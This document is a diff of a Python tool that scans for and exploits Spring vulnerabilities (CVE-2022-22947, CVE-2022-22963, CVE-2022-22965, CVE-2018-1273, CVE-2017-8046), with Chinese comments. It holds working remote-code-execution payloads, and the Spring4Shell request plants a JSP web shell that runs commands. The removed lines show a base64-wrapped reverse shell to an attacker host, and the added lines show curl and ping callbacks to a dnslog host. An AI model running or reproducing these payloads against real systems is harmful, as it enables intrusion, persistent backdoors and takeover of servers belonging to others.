@@ -10,18 +10,16 @@ import urllib3
 import threading
 import base64
 init(autoreset=True)
-readme=input("针对cve-2022-22963漏洞最好有一台在公网上，能监听的主机，没钱的家庭可以到路由器映射自己的端口出去（按任意键继续）")
-lhost=input("输入监听主机IP：")
-lport=input("输入监听端口：")
-print(colorama.Fore.RED+"记得开监听")
+dnslog=input("请输入dnslog.py运行后获得的结果：")
 url=input("输入想要测试的域名或IP：")
 print("")
-##暂时只有Sping系列的信息泄露、cve-2022-22947、cve-2022-22963、cve-2022-22965
+##v1.3 去除1.2版本需要vps的前提，增加CVE-2018-1273，CVE-2017-8046，现在使用dnslog.py调用dnslog验证无回显漏洞
 ##by Skr11lex & 一江明月
 
+
 ###############################################################################################################################
-
-
+print("########################################################")
+#cve-2022-22947
 headers = {
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
     'Content-Type': 'application/json'
@@ -41,21 +39,18 @@ if r.status_code==201:
         r=requests.get(url+"actuator/gateway/routes/"+routename,headers=headers,data=json.dumps(data))
         if r.status_code==200:
             print(colorama.Fore.CYAN+"[+]"+url+"存在CVE-2022-22947漏洞，输出结果")
+            print("########################################################")
             a=r.json()
             print(colorama.Fore.CYAN+a['filters'][0].split("'")[1])
 else:
-    print(url+"不存在CVE-2022-22947漏洞")
-print("################################")
-print("################################")
+    print("[-]"+url+"目标不存在CVE-2022-22947漏洞")
+    print("########################################################")
+print('')
+print("########################################################")
 
-
-command='bash -i >&/dev/tcp/'+lhost+'/'+lport+' 0>&1'
-command1=command.encode('utf-8')
-command2=str(base64.b64encode(command1))
-command3 = command2.strip('b')
-command4 = command3.strip("'")
-command5 = 'bash -c {echo,' + command4 + '}|{base64,-d}|{bash,-i}'
-payload = f'T(java.lang.Runtime).getRuntime().exec("{command5}")'
+#cve-2022-22963
+command='curl '+dnslog
+payload = f'T(java.lang.Runtime).getRuntime().exec("{command}")'
 headers2 = {
     'spring.cloud.function.routing-expression': payload,
     'Accept-Encoding': 'gzip, deflate',
@@ -64,20 +59,22 @@ headers2 = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
     'Content-Type': 'application/x-www-form-urlencoded'
 }
-path = '/functionRouter'
+path = 'functionRouter'
 data = 'test'
 r1 = requests.post(url=url+path, headers=headers2, data=data,)
 if r1.status_code == 500:
-    print(colorama.Fore.CYAN+"[+]" + url + "可能存在CVE-2022-22963漏洞，看看监听有没有返回shell")
+    print(colorama.Fore.CYAN+"[+]" + url + "可能存在cve-2022-22963，返回终端看有无Dnslog请求")
+    print("########################################################")
 else:
     print("[-]"+url+"目标不存在CVE-2022-22963漏洞")
+    print("########################################################")
 
 
 
 
-print("################################")
-print("################################")
-
+print('')
+print("########################################################")
+#cve-2022-22965
 headers3 = {
     "suffix": "%>//",
     "c1": "Runtime",
@@ -88,11 +85,67 @@ headers3 = {
 url1=url+'?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
 r=requests.get(url=url1,headers=headers3)
 if r.status_code==200:
-    print(colorama.Fore.CYAN+"[+]"+url+"目标存在CVE-2022-22965漏洞，访问"+url+"tomcatwar.jsp?pwd=j&cmd=id")
+    print(colorama.Fore.CYAN+"[+]"+url+"目标可能存在CVE-2022-22965漏洞，访问"+url+"tomcatwar.jsp?pwd=j&cmd=id")
+    print("########################################################")
 else:
     print("[-]"+url+"目标不存在CVE-2022-22965漏洞")
+    print("########################################################")
 
 
+print('')
+print("########################################################")
+#cve-2018-1273
+cve_2018_1273path='users'
+cve_2018_1273payload='username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping '+dnslog+'")]=&password=&repeatedPassword='
+cve_2018_1273headers={
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
+    'Content-Type':'application/x-www-form-urlencoded'
+}
+cve_2018_1273request=requests.post(url=url+cve_2018_1273path,headers=cve_2018_1273headers,data=cve_2018_1273payload)
+if cve_2018_1273request.status_code==500:
+    print(colorama.Fore.CYAN+"[+]" + url + '可能存在CVE-2018-1273，返回终端看有无Dnslog请求')
+    print("########################################################")
+else:
+    print('#'"[-]"+url+'目标不存在CVE-2018-1273漏洞')
+    print("########################################################")
+
+
+
+
+print('')
+print("########################################################")
+#CVE-2017-8046
+cve_2017_8046_base1=('ping '+dnslog)
+cve_2017_8046_base2=cve_2017_8046_base1.encode('utf-8')
+cve_2017_8046_base3=str(base64.b64encode(cve_2017_8046_base2))
+cve_2017_8046_base_drop1=cve_2017_8046_base3.strip('b')
+cve_2017_8046_base_drop2=cve_2017_8046_base_drop1.strip("'")
+cve_2017_8046_base_drop_end=cve_2017_8046_base_drop2
+cve_2017_8046_payload1=('bash -c {echo,'+cve_2017_8046_base_drop_end+'}|{base64,-d}|{bash,-i}').encode()
+cve_2017_8046_payload_end = ','.join(str(i) for i in list(cve_2017_8046_payload1))
+
+cve_2017_8046_d=(
+'[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{'+cve_2017_8046_payload_end+'}))/lastname", "value": "vulhub" }]'
+)##构造payload
+cve_2017_8046_h={
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
+    'Content-Type': 'application/json-patch+json'
+}
+print(cve_2017_8046_payload_end)
+cve_2017_8046_path='customers/1'##漏洞路径
+cve_2017_8046_r=requests.patch(url=url+cve_2017_8046_path,headers=cve_2017_8046_h,data=cve_2017_8046_d)
+if cve_2017_8046_r.status_code==400:
+    print(colorama.Fore.CYAN+"[+]" + url + '可能存在CVE-2017-8046，返回终端看有无Dnslog请求')
+    print("########################################################")
+else:
+    print('#'"[-]" + url + '目标不存在CVE-2017-8046漏洞')
+    print("########################################################")
+
+
+
+
+
+print('')
 print("Spring敏感接口扫描开始")
 def get_path(url,file = "mulu.txt"):
     path_queue = queue.Queue()
@@ -112,7 +165,7 @@ def get_url(path_queue):
             respone = http.request('GET', url)
             if respone.status == 200:
                 #print("[%d] => %s" % (respone.status, url))
-                print("以下URL可能存在Spring boot信息泄露")
+                print(colorama.Fore.CYAN+"以下URL可能存在Spring boot信息泄露")
                 print( url)
         except:
             pass
@@ -135,7 +188,7 @@ if __name__ == "__main__":
 
     url = url
     #threadnum = int(input("输入线程数量: "))
-    threadnum=15
+    threadnum=10
     main(url, threadnum)
     end = time.time()
     print("总共耗时 %.2f" % (end-start))
@@ -144,4 +197,5 @@ if __name__ == "__main__":
 
 print("扫描完毕")
 
-end=input('寄，什么都扫不出')##防止打包exe之后运行闪退
+end=input('你的支持是我的动力，如果觉得写得不错，欢迎加入我们，微信群：http://mrw.so/6fMUda')
+
